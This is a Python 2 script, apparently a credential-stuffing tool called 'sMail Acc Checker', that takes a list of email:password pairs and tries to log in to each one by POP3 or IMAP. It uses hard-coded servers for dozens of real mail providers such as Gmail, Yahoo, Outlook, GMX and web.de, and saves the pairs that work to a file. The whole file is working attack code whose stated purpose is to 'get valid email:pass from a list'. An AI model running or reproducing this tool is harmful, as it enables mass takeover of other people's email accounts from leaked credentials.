# Python sMail Acc Checker
# author: m0nk3y
# With this tool you can get valid email:pass from a list

import linecache
import sys, poplib
import time
import argparse
import csv
import imaplib

parser = argparse.ArgumentParser(description='This script checks a given file for valid email accounts (testing default: POP3)')
parser.add_argument('-f','--file', help='File with <account@provider.com>:<passwd> each line',required=False,default=None)
parser.add_argument('-s','--sleep', help='Break between each check',required=False,default=0)
parser.add_argument('-p','--provider', help='Specify a provider -p [tag]',required=False,default=None)
parser.add_argument('-o','--output', help='Filename to write output into',required=False,default=False)
parser.add_argument('-n','--nonvalid', help='Filename to write nonvalid output into',required=False,default=False)
parser.add_argument('-i','--imap', help='use IMAP instead of POP3 (e.g. for Hotmail/Outlook)',required=False,default=False,action="store_true")
parser.add_argument('-l','--list', help='List all supported Provider-Tags',required=False,default=False,action="store_true")

args = parser.parse_args()

providers = []
providers_imap = []
accounts = []

results = []
nonvalid = []

class c:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def main():

    print  c.HEADER+"[***************************]"
    print "[*  sMail Account Checker  *]"
    print "[***************************]"+c.ENDC
    print c.FAIL+"    ---- by m0nk3y ----\n"+c.ENDC

    if args.list:
        listProviders()
        exit(1)

    if args.file == None:
        print c.FAIL+c.BOLD+"No input file given   -f <filename>"+c.ENDC
        exit(1)
    print "[~] File: " + c.BOLD+ args.file + c.ENDC
    print "[~] Sleep: " + c.BOLD+ str(args.sleep) + c.ENDC
    try:
        parseEmails(args.file)
    except:
        PrintException()

    print "[~] Acounts in file: " + c.BOLD+ str(len(accounts)) + c.ENDC
    print c.BOLD+c.WARNING+"[*] Testing Accounts"+c.ENDC

    if len(accounts) > 0:
        if args.imap:
            testAccountsIMAP(providers_imap,args.sleep)
        testAccounts(providers,args.sleep)

        printResult()

    else:
        print c.FAIL+c.BOLD+"\nCouldn't find any account in your file (wrong filename?)\n"+c.ENDC

    exit(0)

def listProviders():
    global providers
    global providers_imap

    print "\n[*] Supported POP3 Provider-Tags:"
    for p in providers:
        print p.tag

    print "\n[*] Supported IMAP Provider-Tags:"
    for pi in providers_imap:
        print pi.tag

    print "\n"+c.BOLD+c.OKGREEN+str(len(providers)+len(providers_imap))+" providers are supported. ("+str(len(providers))+" POP3 and "+str(len(providers_imap))+" IMAP)"+c.ENDC

def printResult():
    global results
    global nonvalid
    print c.BOLD+"\n[=] Valid accounts found: "+str(len(results))+c.ENDC
    print str(len(accounts)-len(nonvalid))+" not tested"
    for r in results:
        print r

def testAccounts(providers,sleep):
    global results
    global nonvalid
    global accounts

    for provider in providers:
        if args.provider != None:
            if provider.tag != args.provider:
                continue
        print c.BOLD+"\n[*] Checking POP3 for provider "+c.UNDERLINE+provider.tag+c.ENDC
        for acc in accounts:
            if len(acc) != 2:
                continue
            email = acc[0]
            passwd = acc[1]

            if email.find(provider.tag) == -1:
                continue
            #print "[-] Checking "+email

            try:
                pop = poplib.POP3_SSL(provider.server, provider.port)
                pop.user(email)
                pop.pass_(passwd)
                print c.BOLD+c.OKGREEN+"[!] "+email+"\t success!"+c.ENDC
                results.append(email+":"+passwd)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, email+":"+passwd)
                    except:
                        PrintException()
                pop.quit()
                accounts.remove(acc)
            except:
                print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
                nonvalid.append(email+":"+passwd)
                if args.nonvalid!=False:
                    try:
                        writeIntoFile(args.nonvalid, email+":"+passwd)
                    except:
                        PrintException()

            time.sleep(sleep)

def testAccountsIMAP(providers_imap, sleep):
    global results
    global nonvalid
    global accounts

    for provider in providers_imap:
        if args.provider != None:
            if provider.tag != args.provider:
                continue
        print c.BOLD+"\n[*] Checking IMAP for provider "+c.UNDERLINE+provider.tag+c.ENDC

        for acc in accounts:
            if len(acc) != 2:
                continue
            email = acc[0]
            passwd = acc[1]

            if email.find(provider.tag) == -1:
                continue
            #print "[-] Checking "+email

            try:
                mail = imaplib.IMAP4_SSL(provider.server)
                mail.login(email, passwd)
                print c.BOLD+c.OKGREEN+"[!] "+email+"\t success!"+c.ENDC
                typ, data = mail.list()
                mail.logout()
                results.append(email+":"+passwd)
                accounts.remove(acc)
                if args.output!=False:
                    try:
                        writeIntoFile(args.output, email+":"+passwd)
                    except:
                        PrintException()

            except:
                print c.FAIL+"[!] "+email+"\t failed!"+c.ENDC
                nonvalid.append(email+":"+passwd)
                if args.nonvalid!=False:
                    try:
                        writeIntoFile(args.nonvalid, email+":"+passwd)
                    except:
                        PrintException()

            time.sleep(sleep)


def parseEmails(file):
    global accounts
    with open(file,'r') as f:
        #next(f) # skip headings
        reader=csv.reader(f,delimiter=':')
        for line in reader:
           accounts.append(line)

def PrintException():
    exc_type, exc_obj, tb = sys.exc_info()
    f = tb.tb_frame
    lineno = tb.tb_lineno
    filename = f.f_code.co_filename
    linecache.checkcache(filename)
    line = linecache.getline(filename, lineno, f.f_globals)
    print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)

class Provider:
    tag = None
    server = None
    port = None

    def __init__(self, tag, server, port):
        self.tag = tag
        self.server = server
        self.port = port


def writeIntoFile(filename, value):
    global c
    if value != None:
        with open(filename, "a") as file:
            file.write(value+"\n")
        file.close()
    else:
        print c.FAIL+c.BOLD+"Error while creating File :: no content given"+c.ENDC


# List of Providers:
providers.append(Provider("hs-weingarten.de","mail.hs-weingarten.de",995))
providers.append(Provider("gmail.com","pop.gmail.com",995))
providers.append(Provider("gmx.net","pop.gmx.net",995))
providers.append(Provider("web.de","pop3.web.de",995))
providers.append(Provider("1und1.de","pop.1und1.de",995))
providers.append(Provider("a1.net","pop.a1.net",110))
providers.append(Provider("alice.de","pop3.alice.de",110))
providers.append(Provider("arcor.de","pop3.arcor.de",110))
providers.append(Provider("chello.at","pop.chello.at",110))
providers.append(Provider("compuserve.de","pop.compuserve.de",110))
providers.append(Provider("drei.at","pop3.drei.at",995))
providers.append(Provider("easyline.at","pop.easyline.at",110))
providers.append(Provider("everyday.com","virtual.everyday.com",110))
providers.append(Provider("freenet.de","mx.freenet.de",110))
providers.append(Provider("upcbusiness.at","mail.upcbusiness.at",995))
providers.append(Provider("kabelbw.de","pop.kabelbw.de",110))
providers.append(Provider("kabelmail.de","pop3.kabelmail.de",110))
providers.append(Provider("kabsi.at","mail.kabsi.at",110))
providers.append(Provider("linzag.net","pop.linzag.net",110))
providers.append(Provider("live.com","pop3.live.com",995))
providers.append(Provider("liwest.at","pop.liwest.at",110))
providers.append(Provider("o2mail.de","mail.o2mail.de",110))
providers.append(Provider("o2online.de","pop.o2online.de",995))
providers.append(Provider("t-online.de","securepop.t-online.de",995))
providers.append(Provider("vodafone.de","pop.vodafone.de",995))
providers.append(Provider("yahoo.com","pop.mail.yahoo.com",995))
providers.append(Provider("yahoo.de","pop.mail.yahoo.de",995))
providers.append(Provider("aol.com","pop.aol.com",110))
providers.append(Provider("pop.aim.com","pop.aim.com",110))
providers.append(Provider("firemail.de","firemail.de",110))
providers.append(Provider("mail.de","pop.mail.de",995))
providers.append(Provider("smart-mail.de","pop.smart-mail.de",110))
providers.append(Provider("sxmail.de","pop3.sxmail.de",110))
providers.append(Provider("unitybox.de","mail.unitybox.de",995))
providers.append(Provider("strato.de","pop3.strato.de",110))


providers_imap.append(Provider("hs-weingarten.de","mail.hs-weingarten.de",993))
providers_imap.append(Provider("hotmail.com","imap-mail.outlook.com",993))
providers_imap.append(Provider("live.com","imap-mail.outlook.com",993))
providers_imap.append(Provider("live.de","imap-mail.outlook.com",993))
providers_imap.append(Provider("outlook.com","imap-mail.outlook.com",993))
providers_imap.append(Provider("1und1.de","imap.1und1.de",993))
providers_imap.append(Provider("a1.net","imap.a1.net",143))
providers_imap.append(Provider("alice.de","imap.alice.de",143))
providers_imap.append(Provider("arcor.de","imap.arcor.de",993))
providers_imap.append(Provider("drei.at","imaps.drei.at",993))
providers_imap.append(Provider("freenet.de","mx.freenet.de",993))
providers_imap.append(Provider("gmx.net","imap.gmx.net",993))
providers_imap.append(Provider("gmail.com","imap.gmail.com",993))
providers_imap.append(Provider("googlemail.com","imap.gmail.com",993))
providers_imap.append(Provider("kabelbw.de","imap.kabelbw.de",143))
providers_imap.append(Provider("kabsi.at","imap.kabsi.at",143))
providers_imap.append(Provider("etcologne.de","imap.netcologne.de",993))
providers_imap.append(Provider("o2mail.de","mail.o2mail.de",143))
providers_imap.append(Provider("o2online.de","imap.o2online.de",143))
providers_imap.append(Provider("cablelink.at","mail.cablelink.at",143))
providers_imap.append(Provider("telering.at","mail.telering.at",993))
providers_imap.append(Provider("t-online.de","secureimap.t-online.de",993))
providers_imap.append(Provider("vodafone.de","imap.vodafone.de",993))
providers_imap.append(Provider("web.de","imap.web.de",993))
providers_imap.append(Provider("yahoo.de","imap.mail.yahoo.de",993))

main()